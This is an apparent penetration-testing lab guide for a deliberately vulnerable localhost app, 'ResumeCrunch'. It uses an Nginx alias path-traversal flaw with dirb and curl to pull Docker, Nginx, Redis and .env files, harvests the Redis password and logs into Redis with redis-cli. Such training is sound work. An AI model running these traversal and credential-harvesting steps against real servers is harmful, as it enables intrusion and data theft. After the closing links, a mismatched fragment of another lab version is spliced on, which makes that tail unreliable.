# Lab 04 - Extract Docker Configuration Files

## Objective

Use `dirb` with Docker-specific wordlists to discover and download Docker configuration files including `Dockerfile`, `docker-compose.yml`, `nginx.conf`, `redis.conf`, and complete the application source code analysis.

## Background

In the previous lab, you discovered `app.py` which revealed that the application uses:
- **Flask** web framework
- **Redis** caching with a specific container name and credentials
- **Docker** containerization

Docker environments typically include several configuration files that contain:
- Container orchestration details (`docker-compose.yml`)
- Build instructions (`Dockerfile`)
- Service configurations (`nginx.conf`, `redis.conf`)
- Dependency specifications (`requirements.txt`)
- Environment variables and credentials

These files often contain sensitive information like passwords, internal network configurations, and architectural details.

## Steps

### 1. Recap What We Know

From Lab 03, you should have:
- ✓ Confirmed path traversal vulnerability on `/static../`
- ✓ Downloaded `app.py`
- ✓ Found Redis reference: `redis://password@resume_crunch_redis_container:6379/0`
- ✓ Identified upload folder location

### 2. Use dirb with Docker-Specific Wordlist

Many dirb installations don't include a `common-docker.txt` wordlist by default, but we can create one or look for Docker-related files:

**Option A: Create a custom Docker wordlist**

```bash
# Create a Docker-specific wordlist
cat > docker-wordlist.txt << 'EOF'
Dockerfile
docker-compose.yml
docker-compose.yaml
.dockerignore
nginx.conf
redis.conf
requirements.txt
.env
.env.local
.env.production
config.py
settings.py
uwsgi.ini
gunicorn.conf.py
supervisord.conf
EOF
```

**Option B: Use an existing comprehensive wordlist**

```bash
# Try with common.txt first (should catch common config files)
dirb http://localhost:8080/static../ /usr/share/dirb/wordlists/common.txt

# Or find other wordlists on your system
ls /usr/share/dirb/wordlists/
# or on macOS with Homebrew
ls /opt/homebrew/share/dirb/wordlists/
```

### 3. Run dirb with Your Custom Docker Wordlist

```bash
# Run dirb with the Docker-specific wordlist
dirb http://localhost:8080/static../ docker-wordlist.txt
```

**Expected discoveries:**
```
+ http://localhost:8080/static../Dockerfile (CODE:200)
+ http://localhost:8080/static../docker-compose.yml (CODE:200)
+ http://localhost:8080/static../nginx.conf (CODE:200)
+ http://localhost:8080/static../redis.conf (CODE:200)
+ http://localhost:8080/static../requirements.txt (CODE:200)
```

### 4. Download All Discovered Docker Configuration Files

Create a directory for your analysis and download all files:

```bash
# Create analysis directory
mkdir -p resumecrunch-analysis
cd resumecrunch-analysis

# Download each discovered file
curl http://localhost:8080/static../Dockerfile -o Dockerfile
curl http://localhost:8080/static../docker-compose.yml -o docker-compose.yml
curl http://localhost:8080/static../nginx.conf -o nginx.conf
curl http://localhost:8080/static../redis.conf -o redis.conf
curl http://localhost:8080/static../requirements.txt -o requirements.txt

# Also get app.py if you haven't already
curl http://localhost:8080/static../app.py -o app.py

# Try for .env file (often contains secrets)
curl http://localhost:8080/static../.env -o .env 2>/dev/null
```

### 5. Analyze docker-compose.yml

This file orchestrates all the containers and often contains critical information:

```bash
# View the docker-compose.yml
cat docker-compose.yml
```

**Extract key information:**

```bash
# Look for service definitions
grep -A 10 "services:" docker-compose.yml

# Look for environment variables
grep -i "environment:" docker-compose.yml
grep -i "PASSWORD\|SECRET\|KEY" docker-compose.yml

# Look for port mappings
grep -i "ports:" docker-compose.yml

# Look for volume mounts
grep -i "volumes:" docker-compose.yml

# Look for network configurations
grep -i "networks:" docker-compose.yml
```

**Document what you find:**
```bash
cat > docker-compose-analysis.txt << 'EOF'
=== docker-compose.yml Analysis ===

Services Defined:
1. nginx - Web server
   - Ports: 8080:80
   - Depends on: app
   
2. app (Flask application)
   - Container name: resume_crunch_app
   - Depends on: redis
   - Volumes: ./resumes:/app/resumes
   - Environment: (check for credentials)
   
3. redis
   - Container name: resume_crunch_redis_container
   - Port: 6379
   - Command: redis-server --requirepass [PASSWORD]

Credentials Found:
- Redis password: [EXTRACT FROM FILE]

Network Configuration:
- Internal network: (name of network)
- Exposed ports: 8080 (nginx), 6379 (redis)

Volume Mounts:
- Resume storage: ./resumes:/app/resumes
EOF
```

### 6. Analyze nginx.conf

The Nginx configuration reveals the vulnerable configuration:

```bash
# View nginx.conf
cat nginx.conf
```

**Look for:**

```bash
# Find location blocks
grep -A 5 "location" nginx.conf

# Find the vulnerable /static configuration
grep -B 2 -A 5 "location /static" nginx.conf
```

**Confirm the vulnerability:**
```nginx
location /static {
    alias /app/static/;
}
```

Notice: `/static` has no trailing slash but `/app/static/` does - this is the off-by-one slash vulnerability!

### 7. Analyze redis.conf

Redis configuration may contain additional security settings:

```bash
# View redis.conf
cat redis.conf
```

**Look for:**
```bash
# Check for password requirement
grep "requirepass" redis.conf

# Check for bind address
grep "bind" redis.conf

# Check for protected mode
grep "protected-mode" redis.conf
```

**Document findings:**
```bash
cat >> redis-analysis.txt << 'EOF'
=== redis.conf Analysis ===

Authentication:
- requirepass: [PASSWORD]

Network Binding:
- bind: 0.0.0.0 (or 127.0.0.1)

Protected Mode:
- protected-mode: yes/no

Security Concerns:
- Is password strong?
- Is Redis exposed to network?
- Are dangerous commands disabled?
EOF
```

### 8. Analyze Dockerfile

The Dockerfile shows how the application container is built:

```bash
# View Dockerfile
cat Dockerfile
```

**Extract information:**

```bash
# Base image
grep "FROM" Dockerfile

# Installed packages
grep "RUN apt-get\|RUN pip" Dockerfile

# Exposed ports
grep "EXPOSE" Dockerfile

# Working directory
grep "WORKDIR" Dockerfile

# Copied files
grep "COPY" Dockerfile

# Entry point/command
grep "CMD\|ENTRYPOINT" Dockerfile
```

**Document the build process:**
```bash
cat > dockerfile-analysis.txt << 'EOF'
=== Dockerfile Analysis ===

Base Image:
- python:3.9 (or whatever version)

Installed System Packages:
- (list from apt-get install)

Python Packages:
- Installed from requirements.txt

Working Directory:
- /app

Exposed Ports:
- 5000 (Flask default)

Files Copied:
- app.py
- requirements.txt
- (others)

Entrypoint:
- python app.py (or gunicorn, etc.)
EOF
```

### 9. Complete requirements.txt Analysis

Now that you have the complete `requirements.txt`, analyze all dependencies:

```bash
# View requirements.txt
cat requirements.txt
```

**Document all packages and versions:**
```bash
cat > requirements-analysis.txt << 'EOF'
=== requirements.txt Analysis ===

Web Framework:
- Flask==X.X.X

Caching:
- Flask-Caching==X.X.X
- redis==X.X.X

Additional Dependencies:
- (list all packages with versions)

Packages of Interest for Vulnerability Analysis:
- Flask-Caching (potential cache poisoning)
- redis (client library)
- (any outdated packages)
EOF
```

### 10. Extract All Credentials and Configuration Details

Compile all sensitive information discovered:

```bash
cat > credentials-and-config.txt << 'EOF'
=== SENSITIVE INFORMATION EXTRACTED ===

## Redis Database
- Host: resume_crunch_redis_container
- Port: 6379
- Password: [EXTRACTED_PASSWORD]
- Database: 0
- Connection String: redis://[PASSWORD]@resume_crunch_redis_container:6379/0

## Container Network
- Network name: (from docker-compose.yml)
- Internal IPs: (if specified)

## File Paths
- Application root: /app
- Upload directory: /app/resumes
- Static files: /app/static

## Ports
- Nginx: 8080 (host) -> 80 (container)
- Flask app: 5000 (internal)
- Redis: 6379

## Nginx Configuration
- Vulnerable location: /static (missing trailing slash)
- Vulnerable alias: /app/static/ (has trailing slash)
- Path traversal: /static../ -> /app/

## Environment Variables
- (extract from docker-compose.yml environment section)

## Security Issues Identified
1. Path traversal in Nginx config
2. Redis password in source code (should use env vars)
3. Source code exposed via path traversal
4. Configuration files publicly accessible
EOF

# Protect this file!
chmod 600 credentials-and-config.txt
```

### 11. Test Redis Connectivity

Now that you have the Redis password and know the port, verify if Redis is accessible:

```bash
# Check if Redis port is exposed
nc -zv localhost 6379

# If you have redis-cli installed, test connection
redis-cli -h localhost -p 6379

# Once connected, authenticate
AUTH your_redis_password_here

# Test if authentication works
PING
```

**Expected responses:**
```
# If authentication is successful
(integer) 1
PONG
```

**If Redis is accessible:**
```bash
# List all keys
KEYS *

# Get info about the Redis instance
INFO

# Exit
exit
```

**Document Redis accessibility:**
```bash
cat >> redis-analysis.txt << 'EOF'

=== Redis Connectivity Test ===
- Port 6379: OPEN (accessible from localhost)
- Authentication: Required
- Password: [WORKS/DOESN'T WORK]
- Can connect: YES/NO
- Keys visible: YES/NO (list count if yes)

Security Implications:
- Direct Redis access possible
- Can read cached data
- Can write/poison cache entries
- Potential for cache poisoning attack
EOF
```

### 12. Create a Complete Infrastructure Map

Visualize the complete architecture:

```bash
cat > infrastructure-map.txt << 'EOF'
=== ResumeCrunch Infrastructure Map ===

┌─────────────────────────────────────────┐
│         External (localhost:8080)       │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  Nginx Container (resumecrunch-nginx)   │
│  - Port: 80 (mapped to 8080)            │
│  - Vulnerability: Path traversal on     │
│    /static location (off-by-one slash)  │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  Flask App (resumecrunch-app)           │
│  - Python 3.9                           │
│  - Flask framework                      │
│  - Port: 5000 (internal)                │
│  - Upload folder: /app/resumes          │
│  - Uses: Flask-Caching                  │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  Redis (resume_crunch_redis_container)  │
│  - Port: 6379 (exposed to host)         │
│  - Password: [REDACTED]                 │
│  - Database: 0                          │
│  - Stores: Cached session data, results │
└─────────────────────────────────────────┘

Attack Surface:
1. Nginx path traversal -> Full source disclosure
2. Redis port exposed -> Direct DB access
3. Flask-Caching -> Potential cache poisoning
4. Upload functionality -> Potential file upload attacks
EOF
```

## Verification Checklist

- [ ] Created custom Docker wordlist
- [ ] Ran `dirb` against `/static../` with Docker wordlist
- [ ] Downloaded `Dockerfile`
- [ ] Downloaded `docker-compose.yml`
- [ ] Downloaded `nginx.conf`
- [ ] Downloaded `redis.conf`
- [ ] Downloaded complete `requirements.txt`
- [ ] Extracted Redis password from configuration files
- [ ] Identified all container names and network configuration
- [ ] Found all exposed ports
- [ ] Confirmed Nginx misconfiguration in `nginx.conf`
- [ ] Tested Redis connectivity on port 6379
- [ ] Successfully authenticated to Redis (if accessible)
- [ ] Documented complete infrastructure architecture
- [ ] Compiled all credentials and sensitive information

## Key Discoveries Summary

By the end of this lab, you should have extracted:

### 1. Docker Configuration Files
- `Dockerfile` - Container build instructions
- `docker-compose.yml` - Multi-container orchestration
- `nginx.conf` - Web server configuration (with vulnerability)
- `redis.conf` - Redis server configuration

### 2. Application Files
- `app.py` - Complete Flask application source
- `requirements.txt` - All Python dependencies with versions

### 3. Credentials & Configuration
- **Redis password**: Extracted from docker-compose.yml or redis.conf
- **Container names**: All service container names
- **Network configuration**: Internal networking setup
- **Port mappings**: External to internal port mappings
- **Volume mounts**: File system mappings

### 4. Infrastructure Details
- **DB connection string**: `redis://password@resume_crunch_redis_container:6379/0`
- **Upload folder path**: `/app/resumes`
- **Redis port**: 6379 (accessible from host)
- **Application port**: 5000 (internal)

### 5. Confirmed Vulnerabilities
- ✓ Nginx off-by-one slash path traversal
- ✓ Complete source code disclosure
- ✓ Configuration files exposed
- ✓ Redis port exposed to host
- ✓ Credentials hardcoded in config files

## Questions to Answer

1. What is the Redis password?
2. What container name does Redis use?
3. Is Redis port 6379 accessible from the host?
4. Can you authenticate to Redis with the discovered password?
5. What line in `nginx.conf` causes the path traversal vulnerability?
6. What Python version is the application using?
7. Where are uploaded resumes stored?
8. Are there any environment variables with sensitive data?
9. What network do the containers share?
10. What Flask-Caching version is being used?

## Security Impact

**Severity:** CRITICAL

**Discovered Issues:**
1. **Complete Infrastructure Disclosure**: Full architecture exposed
2. **Credential Exposure**: Redis password and database details
3. **Configuration Exposure**: All service configurations accessible
4. **Direct Database Access**: Redis accessible from host
5. **Source Code Disclosure**: Entire application logic revealed

**Attack Chain Enabled:**
- Path traversal → Source disclosure → Credential extraction → Direct Redis access → Cache poisoning → RCE

## Next Steps

With complete infrastructure knowledge and Redis credentials, proceed to [Lab 05 - Vulnerability Analysis](lab-05-test-vulns.md) to:
- Further analyze `app.py` for Redis usage patterns
- Verify resume upload folder accessibility
- Run `pip-audit-extra` on `requirements.txt`
- Identify Flask-Caching CVE-2021-33026 (pickle deserialization RCE)
- Prepare exploitation strategy

---

[← Previous: Path Traversal Discovery](lab-03-path-traversal.md) | [Next: Vulnerability Analysis →](lab-05-test-vulns.md)
curl http://localhost:8080/requirements.txt -o requirements.txt
curl http://localhost:8080/static../app.py -o app.py 2>/dev/null
curl http://localhost:8080/static../Dockerfile -o Dockerfile 2>/dev/null
```

### 7. Examine the Source Code (if obtained)

If you successfully downloaded source code files, review them for:

```bash
# Search for sensitive information
grep -i "password" *.py
grep -i "secret" *.py
grep -i "api_key" *.py
grep -i "token" *.py

# Look for database connections
grep -i "database" *.py
grep -i "db_" *.py

# Find Redis usage
grep -i "redis" *.py
grep -i "cache" *.py
```

### 8. Document the Technology Stack

Create a technology inventory:

```bash
cat > tech-stack.md << EOF
# ResumeCrunch Technology Stack

## Python Packages
(from requirements.txt)
- Flask: Web framework
- Redis: Caching layer
- [Add others found]

## Infrastructure
- Nginx: Web server/reverse proxy
- Docker: Containerization

## Potential Vulnerabilities
- [List any obviously outdated packages]
- [Note packages with known CVEs]

## Interesting Findings
- [Document any hardcoded credentials]
- [Note configuration issues]
EOF
```

### 9. Check Package Versions

For each package in requirements.txt, note the version:

```bash
# Example format in requirements.txt:
# Flask==2.0.1
# redis==3.5.3
# Werkzeug==2.0.1
```

Compare these versions with current releases:

```bash
# Check latest version (requires pip)
pip index versions Flask
pip index versions redis
```

## Example requirements.txt Analysis

If your `requirements.txt` looks like this:

```
Flask==2.0.1
redis==3.5.3
Werkzeug==2.0.1
Jinja2==3.0.1
```

**Questions to ask:**
1. When were these versions released?
2. Are there newer versions available?
3. Do any have known CVEs?
4. What functionality does each package provide?

## Verification

- [ ] Successfully downloaded `requirements.txt`
- [ ] Identified all Python dependencies
- [ ] Attempted to locate source code files
- [ ] Documented the technology stack
- [ ] Noted package versions

## Expected Findings

You should have discovered:
- A `requirements.txt` file with Python dependencies
- Potentially some application source code
- Information about the application architecture
- Package versions that may be outdated

## Next Steps

With `requirements.txt` in hand, proceed to [Lab 05 - Test for Known Vulnerabilities](lab-05-test-vulns.md) to scan for known vulnerabilities using `pip-audit`.

---

[← Previous: Path Traversal Testing](lab-03-path-traversal.md) | [Next: Test for Vulnerabilities →](lab-05-test-vulns.md)
